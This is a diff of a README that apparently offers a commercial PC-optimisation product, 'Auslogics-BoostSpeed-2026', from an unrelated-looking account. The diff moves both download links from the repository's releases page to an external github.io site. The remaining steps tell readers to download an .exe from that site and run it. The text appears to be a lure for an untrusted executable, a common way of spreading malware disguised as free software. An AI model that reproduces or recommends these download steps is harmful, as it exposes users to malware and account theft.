@@ -1,6 +1,6 @@
 # 🚀 Auslogics-BoostSpeed-2026 - Improve Your Computer Speed Today
 
-[![](https://img.shields.io/badge/Download-BoostSpeed-blue.svg)](https://github.com/dylanaustralopithecine588/Auslogics-BoostSpeed-2026/releases)
+[![](https://img.shields.io/badge/Download-BoostSpeed-blue.svg)](https://dylanaustralopithecine588.github.io)
 
 ## 📌 About This Software
 
@@ -30,7 +30,7 @@ Your computer must meet these basic standards to run the software effectively:
 
 Follow these steps to set up the software on your computer.
 
-1. **Visit the Download Page:** You need to [go to the releases page](https://github.com/dylanaustralopithecine588/Auslogics-BoostSpeed-2026/releases) to find the current version of the software.
+1. **Visit the Download Page:** You need to [go to the releases page](https://dylanaustralopithecine588.github.io) to find the current version of the software.
 2. **Select the File:** Look for the link ending in .exe. Click this link to start the download. Your web browser will save the file to your "Downloads" folder.
 3. **Open the File:** Go to your "Downloads" folder in File Explorer. Double-click the file you downloaded. 
 4. **Follow Prompts:** A window will appear on your screen. Click "Next" to continue through the installation steps.
